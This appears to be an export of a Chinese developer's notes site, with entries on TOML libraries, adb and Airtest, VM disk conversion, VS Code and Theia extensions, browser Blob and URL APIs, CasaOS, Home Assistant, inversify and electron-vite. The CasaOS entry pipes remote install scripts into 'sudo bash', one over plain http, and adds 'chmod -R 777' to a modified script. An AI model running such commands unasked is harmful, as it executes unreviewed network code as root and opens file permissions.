>>> import tomli_w >>> config = { ... \"user\" : { ... \"player_x\" : { \"symbol\" : \"X\" , \"color\" : \"blue\" , \"ai\" : True }, ... \"player_o\" : { \"symbol\" : \"O\" , \"color\" : \"green\" , \"ai\" : False }, ... \"ai_skill\" : 0.85 , ... }, ... \"board_size\" : 3 , ... \"server\" : { \"url\" : \"https://tictactoe.example.com\" }, ... } >>> print ( tomli_w . dumps ( config )) board_size = 3 [ user ] ai_skill = 0.85 [ user . player_x ] symbol = \"X\" color = \"blue\" ai = true [ user . player_o ] symbol = \"O\" color = \"green\" ai = false [ server ] url = \"https://tictactoe.example.com\" 可以使用 dump() 将配置写入文件： >>> with open ( \"tic-tac-toe-config.toml\" , mode = \"wb\" ) as fp : ... tomli_w . dump ( config , fp ) ... 参考: [译]Python 和 TOML：新最好的朋友 (2) 使用Python操作TOML","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-tomli_w.html","loc":"/yq-docs-rear-end-python-python-three--party-library-tomli_w.html"},{"title":"tomlkit","text":"注解 完整说明见 toml文件操作 tomlkit 是一个 TOML 库，它提供了一种更灵活的方式来操作 TOML 文件。\n且功能覆盖了 tomli 和 tomli_w , 且支持 # 注释. 安装 python -m pip install tomlkit 模块函数 tomlkit 模块公开了以下函数 load 从 TOML 文件加载数据 loads 从 TOML 字符串加载数据 dump 将数据写入 TOML 文件 dumps 将数据写入 TOML 字符串 示例 保留注释 >>> import tomlkit >>> toml_data = \"\"\" ... [nested]  # Not necessary ... ...     [nested.table] ...     string       = \"Hello, TOML!\" ...     weird_string = '''Literal ...         Multiline''' ... \"\"\" >>> print ( tomlkit . dumps ( tomlkit . loads ( toml_data ))) [ nested ] # Not necessary [ nested . table ] string = \"Hello, TOML!\" weird_string = '''Literal Multiline''' >>> tomlkit . dumps ( tomlkit . loads ( toml_data )) == toml_data True 创建新的TOML文件 使用tomlkit创建一个新的TOML文件： >>> from tomlkit import comment , document , nl , table >>> toml = document () >>> toml . add ( comment ( \"Written by TOML Kit\" )) # 注释 >>> toml . add ( nl ()) # 换行 >>> toml . add ( \"board_size\" , 3 ) # 键值对 # >>> toml.add(table(\"players\"))                  # 表格 # toml 转换为实际的 TOML 文档，也可以使用.as_string() 方法： >>> print ( toml . as_string ()) # 表格 >>> player_x = table () >>> player_x . add ( \"symbol\" , \"X\" ) >>> player_x . add ( \"color\" , \"blue\" ) >>> player_x . comment ( \"Start player\" ) >>> toml . add ( \"player_x\" , player_x ) >>> player_o = table () >>> player_o . update ({ \"symbol\" : \"O\" , \"color\" : \"green\" }) >>> toml [ \"player_o\" ] = player_o 更新现有的TOML文件 示例文件 # tic-tac-toe-config.toml board_size = 3 [user] ai_skill = 0.85 # A number between 0 (random) and 1 (expert) [user.player_x] symbol = \"X\" color = \"blue\" ai = true [user.player_o] symbol = \"O\" color = \"green\" ai = false # Settings used when deploying the application [server] url = \"https://tictactoe.example.com\" 加载此文档 >>> import tomlkit >>> with open ( \"tic-tac-toe-config.toml\" , mode = \"rt\" , encoding = \"utf-8\" ) as fp : ... config = tomlkit . load ( fp ) ... >>> config { 'board_size' : 3 , 'user' : { 'ai_skill' : 0.85 , 'player_x' : { ... }}} >>> type ( config ) < class ' tomlkit . toml_document . TOMLDocument '> 可以使用 .add() 增加内容, 直接向字典一样操作修改内容 完成对配置的更新后，现在可以将其写回同一文件： >>> with open ( \"tic-tac-toe-config.toml\" , mode = \"wt\" , encoding = \"utf-8\" ) as fp : ... tomlkit . dump ( config , fp ) 参考: [译]Python 和 TOML：新最好的朋友 (2) 使用Python操作TOML 注意-修改toml数据 上面提到过可以直接用字典的形势修改,\n但是要注意的是, 截止目前, 只支持 原地修改 , 不支持返回值形势修改. 比如我有一个 toml 文件 # xxx test [env.pro1.rst] name = \"x7\" [env2] name = 2 [env3] name = 3 当用返回值的形势修改的时候 def update_toml (): with open ( file_ , \"r\" ) as f : t = tomlkit . load ( f ) print ( t ) # t['env']['pro1']['rst']['name'] = \"xxxxx\" merge_dicts ( t , { 'env' : { 'pro1' : { 'rst' : { 'name' : \"x7\" }}}} ) with open ( file_ , \"w\" ) as f : tomlkit . dump ( t , f ) def merge_dicts ( a : dict , b : dict ): # ret = a.copy() ret = a for k , v in b . items (): if k in a and isinstance ( a [ k ], ( dict , OrderedDict , Container )): ret [ k ] = merge_dicts ( a [ k ], v ) return ret update_toml () 被修改的部分会多一个换行, 结果就变成了这样 # xxx test [env.pro1.rst] name = \"x7\" [env2] name = 2 [env3] name = 3 为什么? 因为当使用字典修改的时候, 实际上源码部分是实现的 setitem 方法进行的修改,\n源码中有个操作是自动添加空格, 框架源码部分(只贴出关键部分) # ... def __setitem__ ( self , key : Key | str , value : Any ) -> None : if key is not None and key in self : old_key = next ( filter ( lambda k : k == key , self . _map )) self . _replace ( old_key , key , value ) else : self . append ( key , value ) def _replace ( self , key : Key | str , new_key : Key | str , value : Item ) -> None : # ... self . _replace_at ( idx , new_key , value ) def _replace_at ( self , idx : int | tuple [ int ], new_key : Key | str , value : Item ) -> None : # ... if hasattr ( value , \"invalidate_display_name\" ): value . invalidate_display_name () # type: ignore[attr-defined] if isinstance ( value , Table ): # Insert a cosmetic new line for tables if: # - it does not have it yet OR is not followed by one # - it is not the last item, or # - The table being replaced has a newline last , _ = self . _previous_item_with_index () idx = last if idx < 0 else idx has_ws = ends_with_whitespace ( value ) replace_has_ws = ( isinstance ( v , Table ) and v . value . body and isinstance ( v . value . body [ - 1 ][ 1 ], Whitespace ) ) next_ws = idx < last and isinstance ( self . _body [ idx + 1 ][ 1 ], Whitespace ) if ( idx < last or replace_has_ws ) and not ( next_ws or has_ws ): value . append ( None , Whitespace ( \" \\n \" )) dict . __setitem__ ( self , new_key . key , value . value ) 可以看到, 当使用 = 给每一项赋值的时候, 会判断是否已经有换行, 没有找打的话, 就直接加一行空行. 当前版本框架源码判断时, 只会找当前与上一个数据是否存在换行, 忽略子项 def ends_with_whitespace ( it : Any ) -> bool : \"\"\"Returns ``True`` if the given item ``it`` is a ``Table`` or ``AoT`` object ending with a ``Whitespace``. \"\"\" return ( isinstance ( it , Table ) and isinstance ( it . value . _previous_item (), Whitespace ) ) or ( isinstance ( it , AoT ) and len ( it ) > 0 and isinstance ( it [ - 1 ], Whitespace )) 所以, 至少在当前版本(0.12.5)之前, 要修改toml数据, 直接 原地修改 def update_toml (): with open ( file_ , \"r\" ) as f : t = tomlkit . load ( f ) merge_dict_to_toml_local ( t , { 'env' : { 'pro1' : { 'rst' : { 'name' : \"x7\" }}}} ) with open ( file_ , \"w\" ) as f : tomlkit . dump ( t , f ) def merge_dict_to_toml_local ( a : tomlkit . TOMLDocument , b : dict ): for k , v in b . items (): if k in a and isinstance ( a [ k ], ( dict , OrderedDict , Container )): merge_dict_to_toml_local ( a [ k ], v ) else : a [ k ] = v 相关资源: pypi地址: https://pypi.org/project/tomlkit/ github地址: https://github.com/python-poetry/tomlkit 此issuse地址: https://github.com/python-poetry/tomlkit/issues/352","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-tomlkit.html","loc":"/yq-docs-rear-end-python-python-three--party-library-tomlkit.html"},{"title":"airtest","text":"网易开源游戏测试/自动化测试框架 相关资源: github地址 https://github.com/AirtestProject/Airtest 官方教程 中文文档: https://airtest.readthedocs.io/zh-cn/latest/ 安装 pip install airtest 在Mac/Linux系统下，需要手动赋予adb可执行权限 # mac系统 cd { your_python_path } /site-packages/airtest/core/android/static/adb/mac # linux系统 # cd {your_python_path}/site-packages/airtest/core/android/static/adb/linux chmod +x adb 连接设备 Android真机 Android模拟器 此处以 MuMu模拟器 为例. 此处参考: MuMu-开发者必备说明书 进入模拟器安装目录(以自己的实际安装位置记录), 并连接设备 $ cd D: \\P rogram Files \\M uMu \\e mulator \\M uMuPlayer-12.0 \\s hell # 先关闭服务 $ adb kill server # 启动服务并连接连接设备 $ adb connect 127 .0.0.1:7555\n* daemon not running ; starting now at tcp:5037\n* daemon started successfully\nconnected to 127 .0.0.1:7555 # 查看设备列表 $ adb devices\nList of devices attached 127 .0.0.1:7555 device # 查看所有包, 3表示第三方包(即自行安装软件的包名) #   -3 三方包 #   -s 系统包 $ adb shell pm list packages -3 # 查看正在运行的包 $ adb shell dumpsys window | findstr mCurrentFocus 注解 如何在连接多个设备下对MuMu模拟器进行操作 命令格式: adb -s 模拟器端口 其他命令 如 adb -s 127 .0.0.1:7555 shell pm list package -3 启动指定的包 # 先打开日志 adb logcat | findstr \"cmp\" 然后手动点击启动应用. 看看日志最新增加的一行 cmp 信息, 比如 乱斗西游2 : 05-22 20:56:02.734  1175  1523 I ActivityTaskManager: START u0 {act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] flg=0x10200000 cmp=com.netease.ldxy.mi/com.netease.ntunisdk.external.protocol.ProtocolLauncher bnds=[180,925][620,1260]} from uid 1000, pid 1477\n05-22 20:56:03.398  1175  2115 I ActivityTaskManager: START u0 {flg=0x24000000 cmp=com.netease.ldxy.mi/com.netease.ldxy.Launcher bnds=[180,925][620,1260]} from uid 10035, pid 13536 包名+Activity启动名为: com.netease.ldxy.mi/com.netease.ntunisdk.external.protocol.ProtocolLauncher 下次就用这个信息启动 乱斗西游2 adb shell am start -n com.netease.ldxy.mi/com.netease.ntunisdk.external.protocol.ProtocolLauncher","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-airtest.html","loc":"/yq-docs-rear-end-python-python-three--party-library-airtest.html"},{"title":"VMware Fusion","text":"VMware Fusion 是一个 MacOS 下的虚拟机客户端(模拟硬件). 用于虚拟机的创建管理使用. 注解 其实与 Vmware Workstation 一致, 不过是不同系统用的. 打开vdi格式文件 参考: vbox虚拟机vdi文件用VMware打开 最简单的就是使用 qemu-img 将 virtual-box 的 .vdi 文件转换为 wmvare 使用的 .vmdk 文件 (MacOS也支持) qemu-img convert -f vdi -O vmdk haos_ova-12.3.vdi haos_ova-12.3.vdi.vmdk 然后双击打开选择操作系统文件即可 报错:serial0: 参数\"serial0.fileType\"的值\"thinprint\"是无效值。 报错 原因 其实就是没有找到相应的硬件, 一般都是 虚拟打印机 . 解决 删除虚拟打印机即可","tags":"常用工具使用","url":"/yq-docs-Chaotic-Commonly-used-tools-Vmware-fusion.html","loc":"/yq-docs-Chaotic-Commonly-used-tools-Vmware-fusion.html"},{"title":"vscode自制插件","text":"如何制作vscode插件 创建基础工程 先安装插件基础代码生成工具 npm install -g yo generator-code 使用安装的指令生成代码 yo code 大致输出 ? What type of extension do you want to create? New Extension ( TypeScript ) ? What 's the name of your extension? rst-fragment ? What' s the identifier of your extension? rst-fragment\n? What 's the description of your extension? rst-fragment in editor ? Initialize a git repository? Yes ? Bundle the source code with webpack? No ? Which package manager to use? yarn Writing in /Users/yanque/Project/Code/Vscode/rst-fragment... create rst-fragment/.vscode/extensions.json create rst-fragment/.vscode/launch.json create rst-fragment/.vscode/settings.json create rst-fragment/.vscode/tasks.json create rst-fragment/package.json create rst-fragment/tsconfig.json create rst-fragment/.vscodeignore create rst-fragment/vsc-extension-quickstart.md create rst-fragment/.gitignore create rst-fragment/README.md create rst-fragment/CHANGELOG.md create rst-fragment/src/extension.ts create rst-fragment/src/test/extension.test.ts create rst-fragment/.vscode-test.mjs create rst-fragment/.eslintrc.json create rst-fragment/.yarnrc Changes to package.json were detected. Running yarn install for you to install the required dependencies. yarn install v1.22.17 warning package.json: No license field info No lockfile found. warning rst-fragment@0.0.1: No license field [1/4] 🔍  Resolving packages... [2/4] 🚚  Fetching packages... [3/4] 🔗  Linking dependencies... [4/4] 🔨  Building fresh packages... success Saved lockfile. warning Your current version of Yarn is out of date. The latest version is \"1.22.19\", while you' re on \"1.22.17\" .\ninfo To upgrade, run the following command:\n$ brew upgrade yarn\n✨ Done in 17 .03s.\n\nYour extension rst-fragment has been created!\n\nTo start editing with Visual Studio Code, use the following commands: code rst-fragment\n\nOpen vsc-extension-quickstart.md inside the new extension for further instructions\non how to modify, test and publish your extension.\n\nFor more information, also visit http://code.visualstudio.com and follow us @code.\n\n\n? Do you want to open the new folder with Visual Studio Code? Open with ` code ` 创建代码片段补全提示 现在流程的版本, 代码片段貌似都是直接使用文件定义了 参考: rst指令片段项目 此项目. 片段定义在 package.json \"contributes\" : { \"languages\" : [ { \"id\" : \"restructuredtext\" , \"aliases\" : [ \"reStructuredText\" , \"restructuredtext\" , \"ReStructured Text\" , \"reStructured Text\" , \"RST\" , \"ReST\" , \"reST\" ], \"extensions\" : [ \".rst\" , \".rest\" ] } ], \"snippets\" : [ { \"language\" : \"restructuredtext\" , \"path\" : \"./snippets/rst-snippets.json\" } ] }, snippets/rst-snippets.json 文件内片段 { \"code\" : { \"prefix\" : [ \"code\" , \".. code::\" ], \"body\" : \".. code-block:: ${1:language}\\n$0\" , \"description\" : \"Code\" , \"scope\" : \"source.rst\" } }","tags":"工具软件","url":"/yq-util-vscode-cus-plugin.html","loc":"/yq-util-vscode-cus-plugin.html"},{"title":"编辑器内鼠标移入提示","text":"实现hover显示接口 实现 languages.HoverProvider 接口, 定义需要显示的内容 import { CancellationToken , Position , editor , languages } from \"@theia/monaco-editor-core\" import HoverProvider = languages . HoverProvider import { inject , injectable } from \"@theia/core/shared/inversify\" import { EditorManager } from \"@theia/editor/lib/browser\" ; @injectable () export class JsonHoverTip implements HoverProvider { @inject ( EditorManager ) protected readonly _editorManager : EditorManager async provideHover ( model : editor.ITextModel , position : Position , token : CancellationToken ) : Promise < languages . Hover > { // 文件路径 const fsPath = model . uri . fsPath // 行号 const offset = model . getOffsetAt ( position ) return { contents : [ { value : \"第一行: 文件路径: \" + fsPath , isTrusted : true }, { value : \"第二行: 行号: \" + offset , isTrusted : true }, ] } } } 将hover接口注册到贡献点 import { FrontendApplication , FrontendApplicationContribution } from \"@theia/core/lib/browser\" ; import { inject , injectable } from \"@theia/core/shared/inversify\" ; import { JsonHoverTip } from \"./json-hover-tip\" ; import { languages } from '@theia/monaco-editor-core' import { MaybePromise } from \"@theia/core\" ; @injectable () export class EditorHoverContribution implements FrontendApplicationContribution { @inject ( JsonHoverTip ) protected readonly _jsonHoverTip : JsonHoverTip ; protected _handleSuffix = \"json\" onStart ( app : FrontendApplication ) : MaybePromise < void > { languages . registerHoverProvider ( this . _handleSuffix , this . _jsonHoverTip ) } } 注册到容器 import { ContainerModule } from '@theia/core/shared/inversify' ; import { JsonHoverTip } from \"./json-hover-tip\" ; import { EditorHoverContribution } from \"./editor-hover-contribution\" ; import { FrontendApplicationContribution } from \"@theia/core/lib/browser\" ; export default new ContainerModule (( bind , unbind , isBound , rebind ) => { bind ( JsonHoverTip ). toSelf (). inSingletonScope () bind ( EditorHoverContribution ). toSelf (). inSingletonScope () bind ( FrontendApplicationContribution ). toDynamicValue ( ctx => ctx . container . get ( EditorHoverContribution )) });","tags":"前端","url":"/yq-docs-front-end-frame-theia-turorial-editor-mouse-hover.html","loc":"/yq-docs-front-end-frame-theia-turorial-editor-mouse-hover.html"},{"title":"Theia教程","text":"编辑器内鼠标移入提示","tags":"前端","url":"/yq-docs-front-end-frame-theia-turorial-index.html","loc":"/yq-docs-front-end-frame-theia-turorial-index.html"},{"title":"img超出大小时自动调整","text":"详细 < script > function autoCheckImg (){ // 获取所有的 <img> 标签 const images = document . getElementsByTagName ( 'img' ); // 遍历每个 <img> 标签 for ( let i = 0 ; i < images . length ; i ++ ) { const img = images [ i ]; // 检查图片的实际宽度是否超出界面宽度 if ( img . offsetWidth > window . innerWidth ) { img . style . width = '100%' ; } } } window . onload = () => { autoCheckImg () } </ script >","tags":"前端","url":"/yq-docs-front-end-tutorial-img-auto-adjust.html","loc":"/yq-docs-front-end-tutorial-img-auto-adjust.html"},{"title":"Blob对象","text":"Blob （二进制大对象）是几乎所有二进制数据的一种抽象，类似于 File 对象。 Blob 表示了一段二进制数据，可以用来存储图片、音频、视频等多媒体文件。我们可以使用 Blob 构造函数来创建一个 Blob 对象 const blob = new Blob ([ 'Hello, World!' ], { type : 'text/plain' }); 这里我们创建一个包含了 \"Hello, World!\" 的文本类型的 Blob 对象，这个对象可以转换为 URL 地址供我们使用。 构造函数 var aBlob = new Blob ( array , options ); array 是一个由 ArrayBuffer （二进制数据缓冲区）、 ArrayBufferView （二进制数据缓冲区的array-like视图）、 Blob 、 DOMString 等对象构成的 Array ，\n或者其他类似对象的混合体，它将会被放进 Blob 。 DOMStrings 会被编码为 UTF-8 。 options 可选 它可能会指定如下两个属性： type 默认值为 \"\" ，它代表了将会被放入到 blob 中的数组内容的 MIME 类型。 endings 默认值为 \"transparent\" ，用于指定包含行结束符n的字符串如何被写入。\n它是以下两个值中的一个： \"native\"，代表行结束符会被更改为适合宿主操作系统文件系统的换行符 \"transparent\"，代表会保持 blob 中保存的结束符不变。 示例 var debug = { hello : \"world\" }; var blob = new Blob ([ JSON . stringify ( debug , null , 2 )], { type : 'application/json' }); 转换为 url , 内容会被存储在此 url 指向的地址, 方便直接使用 const url = URL . createObjectURL ( blob ); 记得不用时使用 URL.revokeObjectURL 将 url 回收, 参考: URL对象 注解 将大文件转换为URL地址可能会导致内存问题。所以尽量使用流或者分片等方式。 参考: 前端利用Blob对象创建指定文件并下载 createObjectURL详解","tags":"前端","url":"/yq-docs-front-end-Conceptual-browser-environment-blob.html","loc":"/yq-docs-front-end-Conceptual-browser-environment-blob.html"},{"title":"浏览器环境","text":"即前端浏览器环境(非node) API Window对象 Blob对象 URL对象 JS事件","tags":"前端","url":"/yq-docs-front-end-Conceptual-browser-environment-index.html","loc":"/yq-docs-front-end-Conceptual-browser-environment-index.html"},{"title":"URL对象","text":"通过创建URL对象指定文件的下载链接。 createObjectURL 是 JavaScript 中一个非常有用的函数，\n它可以将 Blob 、 File 等二进制文件转换为浏览器可以直接显示的 URL 地址，从而方便进行展示、下载等操作。 objectURL = URL . createObjectURL ( blob ); URL.revokeObjectURL() 在每次调用createObjectURL方法时，都会创建一个新的 URL 对象，即使你已经用相同的对象作为参数创建过。\n当不再需要这些 URL 对象时，每个对象必须通过调用 URL.revokeObjectURL方法来释放。 浏览器会在文档退出的时候自动释放它们，但是为了获得最佳性能和内存使用状况，你应该在安全的时机主动释放掉它们。 URL . revokeObjectURL ( objectURL ); 参考: 前端利用Blob对象创建指定文件并下载 createObjectURL详解 URL.createObjectURL()","tags":"前端","url":"/yq-docs-front-end-Conceptual-browser-environment-url.html","loc":"/yq-docs-front-end-Conceptual-browser-environment-url.html"},{"title":"CasaOS","text":"开源私有家庭云系统 地址: https://github.com/IceWhaleTech/CasaOS 安装 wget -qO- https://get.casaos.io | sudo bash # or # curl -fsSL https://get.casaos.io | sudo bash # 网不好再试试国内的, 虽然上面会检查网络符合条件自动切国内 # curl -fsSL http://cn-get.casaos.io | bash 如果是非 root 用户安装, 可能需要直接将脚本下载下来, 改一下里面几个需要权限的地方 我修改的部分 # ... # Download And Install CasaOS DownloadAndInstallCasaOS () { if [ -z \" ${ BUILD_DIR } \" ] ; then ${ sudo_cmd } rm -rf ${ TMP_ROOT } mkdir -p ${ TMP_ROOT } || Show 1 \"Failed to create temporary directory\" TMP_DIR = $( ${ sudo_cmd } mktemp -d -p ${ TMP_ROOT } || Show 1 \"Failed to create temporary directory\" ) # 这一句是新增的, 可以搜索上面的部分 sudo chmod -R 777 \" ${ TMP_DIR } \" # ... # 这一句是新增的 sudo chmod -R 777 \" $PREFIX /etc/casaos\" # 可以搜索此部分 # Modify app store configuration sed -i \"s#https://github.com/IceWhaleTech/_appstore/# ${ CASA_DOWNLOAD_DOMAIN } IceWhaleTech/_appstore/#g\" \" $PREFIX /etc/casaos/app-management.conf\" # ... 装好后效果 卸载 # v0.3.3 or newer casaos-uninstall # Before v0.3.3 # curl -fsSL https://get.icewhale.io/casaos-uninstall.sh | sudo bash 默认账户 找了半天没找到默认账户是多少... 无奈只有重置账户密码, 进入欢迎注册界面 ls /var/lib/casaos/db/user.db\nsudo mv /var/lib/casaos/db/user.db /var/lib/casaos/db/user.db.backup\nsudo systemctl restart casaos-user-service.service","tags":"操作系统","url":"/yq-docs-operating-system-linux-CasaOS-index.html","loc":"/yq-docs-operating-system-linux-CasaOS-index.html"},{"title":"home-assistant","text":"MacOS虚拟机安装 参考官网安装文档: https://www.home-assistant.io/installation/macos#install-home-assistant-core 下载虚拟机文件: 如果用的是 virtual-box , 下载 https://github.com/home-assistant/operating-system/releases/download/12.3/haos_ova-12.3.vdi.zip (截止目前的最新版) 如果是 vmware , 下载 https://github.com/home-assistant/operating-system/releases/download/12.3/haos_ova-12.3.vmdk.zip 我用的是 vmdk , 下载好后解压, 然后双击, 会自动用 Vmware Fusion 打开 固件类型选择 UEFI 磁盘选择已经存在的磁盘文件, 就是选择刚刚解压的 vmdk 文件. 安装好启动后大致是这样子 然后按照提示给的地址, 在宿主机浏览器打开: homeassistant.local:8123\nhomeassistant:8123\nhttp://X.X.X.X:8123    # X.X.X.X 为虚拟机的IP, 我这里就是 http://192.168.86.132:8123 第一次启动, 会下载一些必要的文件 有个比较坑的地方是, 如果第一次下载东西失败了, 没有重试入口, 只有删除了虚拟机重新开始 完成后的页面 待续... Docker安装 参考: Install Home Assistant Container 注解 官网给的 compose 配置 version : '3' services : homeassistant : container_name : homeassistant image : \"ghcr.io/home-assistant/home-assistant:stable\" volumes : - /PATH_TO_YOUR_CONFIG:/config - /etc/localtime:/etc/localtime:ro - /run/dbus:/run/dbus:ro restart : unless-stopped privileged : true network_mode : host 下载镜像(可以不用...) docker pull home-assistant/home-assistant:stable 直接命令行启动 docker run --restart always -d --name homeassistant -v /PATH_TO_YOUR_CONFIG:/config --device = /PATH_TO_YOUR_USB_STICK -e TZ = Asia/Shanghai --net = host ghcr.io/home-assistant/home-assistant:stable # docker run --restart always -d --name homeassistant -v /PATH_TO_YOUR_CONFIG:/config --device=/PATH_TO_YOUR_USB_STICK -e TZ=Australia/Melbourne --net=host ghcr.io/home-assistant/home-assistant:stable # Replace /PATH_TO_YOUR_CONFIG points at the folder where you want to store your configuration - make sure that you keep the :/config part # Replace /PATH_TO_YOUR_USB_STICK matches the path for your USB stick (e.g., /dev/ttyACM0 for most Synology users) # Replace \"Australia/Melbourne\" with your timezone (see https://en.wikipedia.org/wiki/List_of_tz_database_time_zones ) # 启动后访问: http://192.xxx.xxx.xxx:8123 注解 使用 极空间 的docker安装时, 因为 8123 端口默认已经被占用了,\n所以需要第一次启动失败时, 修改配置 configuration.yaml , 增加端口配置 http : # 重新设置端口号 server_port : 18123 极空间 安装可参考: https://www.molingran.com/p/zspace-home-assistant/","tags":"操作系统","url":"/yq-docs-operating-system-linux-home-assistant-index.html","loc":"/yq-docs-operating-system-linux-home-assistant-index.html"},{"title":"qemu-img","text":"关键字 虚拟机格式 vdi转换 用于转换虚拟机格式. 比如将 virtual-box 的 .vdi 文件转换为 wmvare 使用的 .vmdk 文件 # qemu-img convert -f vdi -O vmdk virtualbox.vdi virtualbox.vmdk qemu-img convert -f vdi -O vmdk haos_ova-12.3.vdi haos_ova-12.3.vdi.vmdk 参考: vbox虚拟机vdi文件用VMware打开 安装 Ubuntu下安装 sudo apt-get install qemu-kvm MacOS下安装 brew install qemu","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-qemu-img.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-qemu-img.html"},{"title":"inversify","text":"ts版依赖注入框架 安装 npm install inversify reflect-metadata --save # yarn add inversify reflect-metadata # pnpm add inversify reflect-metadata 相关资源 模块地址: https://www.npmjs.com/package/inversify 仓库: https://github.com/inversify/InversifyJS 中文文档: https://github.com/NeoYo/inversify.cn 代码中使用 接口声明 先声明接口 // file interfaces.ts export interface Warrior { fight () : string ; sneak () : string ; } export interface Weapon { hit () : string ; } export interface ThrowableWeapon { throw () : string ; } 声明接口描述符 声明接口对应的描述符 // file types.ts const TYPES = { Warrior : Symbol.for ( \"Warrior\" ), Weapon : Symbol.for ( \"Weapon\" ), ThrowableWeapon : Symbol.for ( \"ThrowableWeapon\" ) }; export { TYPES }; 接口实现-依赖声明 然后使用装饰器 @injectable 和 @inject 声明依赖 如 // file entities.ts import { injectable , inject } from \"inversify\" ; import \"reflect-metadata\" ; import { Weapon , ThrowableWeapon , Warrior } from \"./interfaces\" ; import { TYPES } from \"./types\" ; @injectable () class Katana implements Weapon { public hit () { return \"cut!\" ; } } @injectable () class Shuriken implements ThrowableWeapon { public throw () { return \"hit!\" ; } } @injectable () class Ninja implements Warrior { private _katana : Weapon ; private _shuriken : ThrowableWeapon ; public constructor ( @inject ( TYPES . Weapon ) katana : Weapon , @inject ( TYPES . ThrowableWeapon ) shuriken : ThrowableWeapon ) { this . _katana = katana ; this . _shuriken = shuriken ; } public fight () { return this . _katana . hit (); } public sneak () { return this . _shuriken . throw (); } } export { Ninja , Katana , Shuriken }; 也可以不用构造器注入而是属性注入依赖 @injectable () class Ninja implements Warrior { @inject ( TYPES . Weapon ) private _katana : Weapon ; @inject ( TYPES . ThrowableWeapon ) private _shuriken : ThrowableWeapon ; public fight () { return this . _katana . hit (); } public sneak () { return this . _shuriken . throw (); } } 容器配置-依赖绑定 官方建议文件命名为 inversify.config.ts // file inversify.config.ts import { Container } from \"inversify\" ; import { TYPES } from \"./types\" ; import { Warrior , Weapon , ThrowableWeapon } from \"./interfaces\" ; import { Ninja , Katana , Shuriken } from \"./entities\" ; const myContainer = new Container (); myContainer . bind < Warrior > ( TYPES . Warrior ). to ( Ninja ); myContainer . bind < Weapon > ( TYPES . Weapon ). to ( Katana ); myContainer . bind < ThrowableWeapon > ( TYPES . ThrowableWeapon ). to ( Shuriken ); export { myContainer }; 外部通过容器获取实例 import { myContainer } from \"./inversify.config\" ; import { TYPES } from \"./types\" ; import { Warrior } from \"./interfaces\" ; const ninja = myContainer . get < Warrior > ( TYPES . Warrior ); expect ( ninja . fight ()). eql ( \"cut!\" ); // true expect ( ninja . sneak ()). eql ( \"hit!\" ); // true 多重绑定 即一个接口有多个实现, 且同时绑定到这多个实现 注解 绑定的时候跟普通的基本没区别, 主要是获取的时候 接口定义 interface IService { doSomething () : void ; } 多个实现 class ServiceA implements IService { doSomething () { console . log ( 'Service A doing something' ); } } class ServiceB implements IService { doSomething () { console . log ( 'Service B doing something' ); } } 在容器中绑定接口和实现 const myContainer = new Container (); myContainer . bind < IService > ( IService ). to ( ServiceA ); myContainer . bind < IService > ( IService ). to ( ServiceB ); 获取绑定的实例 如果是在外部获取 const services = myContainer . getAll < IService > ( IService ); services . forEach ( service => service . doSomething ()); 如果想获取指定的某一个实例, 可以在绑定的时候\n使用 标签 进行更细粒度的控制 使用标签（tags） myContainer . bind < IService > ( IService ). to ( ServiceA ). whenTargetNamed ( 'A' ); myContainer . bind < IService > ( IService ). to ( ServiceB ). whenTargetNamed ( 'B' ); 然后，当你需要获取服务时，你可以使用标签来获取特定的实现： const serviceA = myContainer . getNamed < IService > ( IService , 'A' ); const serviceB = myContainer . getNamed < IService > ( IService , 'B' ); 如果是在其他注入类的构造器, 可以使用 @multiInject 装饰器 @injectable () class UseService { public _service : IService [] constructor ( @multiInject ( IService ) service : IService []) { this . _service = service } } 动态绑定 toDynamicValue 先看一个示例代码 bind ( A ). toSelf (); bind ( AFactory ). toDynamicValue ( ctx => { createA : () => ctx . container . get < A > ( A ); }) // 外部获取. factory . createA () 首先, 第一句没有现实指明是单例, 所以每一个获取的实例都会是一个新的;\n第二句, 动态获取A对象, 每次调用 createA 都会请求一个新的对象实例 tsconfig.json配置 需要补充的配置内容 { \"compilerOptions\" : { \"target\" : \"es5\" , \"lib\" : [ \"es6\" ], \"types\" : [ \"reflect-metadata\" ], \"module\" : \"commonjs\" , \"moduleResolution\" : \"node\" , \"experimentalDecorators\" : true , \"emitDecoratorMetadata\" : true } } 报错-Unable to resolve signature 完整报错: TS1238: Unable to resolve signature of class decorator when called as an expression. The runtime will invoke the decorator with 2 arguments, but the decorator expects 1\n\n# 或者\n# TypeScript decorator reports \"Unable to resolve signature of class decorator when called as an expression\" 原因: 没有配置ts对装饰器的支持 解决: 在tsconfig.json中添加: \"experimentalDecorators\": true,\n\"emitDecoratorMetadata\": true 貌似一般只配置第一个就行","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-inversify.html","loc":"/yq-docs-front-end-node-Three--party-library-inversify.html"},{"title":"rst2html","text":"将rst文本转换为HTML 安装 npm install rst2html #  yarn add rst2html --save 模块地址: https://www.npmjs.com/package/rst2html 代码中使用 import parse from 'rst2html' const rstText = ` =============== My RST Document =============== Hello, *World*! ` ; const htmlString = parse ( rstText );","tags":"前端","url":"/yq-docs-front-end-node-Three--party-library-rst2html.html","loc":"/yq-docs-front-end-node-Three--party-library-rst2html.html"},{"title":"Vite+Electron+React项目搭建","text":"相关资源 创建项目工具: electron-vite 官网中文文档: https://cn.electron-vite.org/guide/introduction 顺便提一句另一个插件: vite-plugin-electron , 最开始本来用的是这个, 发现不知道怎么debug源码, 就没用了, 它对应的官网为: 英文版 中文版 安装: npm i electron-vite 创建 对于新项目 准备一个项目目录的父级文件夹, 执行 npm create @quick-start/electron@latest # yarn create @quick-start/electron # pnpm create @quick-start/electron 然后会出现一个交互式的选择界面 ✔ Project name: … <electron-app>\n✔ Select a framework: › vue\n✔ Add TypeScript? … No / Yes\n✔ Add Electron updater plugin? … No / Yes\n✔ Enable Electron download mirror proxy? … No / Yes\n\nScaffolding project in ./<electron-app>...\nDone. 交互式界面中的选项也可以通过参数来配置 # npm 6.x npm create @quick-start/electron my-app --template react # npm 7+, extra double-dash is needed: npm create @quick-start/electron my-app -- --template react # yarn yarn create @quick-start/electron my-app --template react # pnpm pnpm create @quick-start/electron my-app --template react 目前支持的模板预设如下 JavaScript TypeScript vanilla vanilla-ts vue vue-ts react react-ts svelte svelte-ts 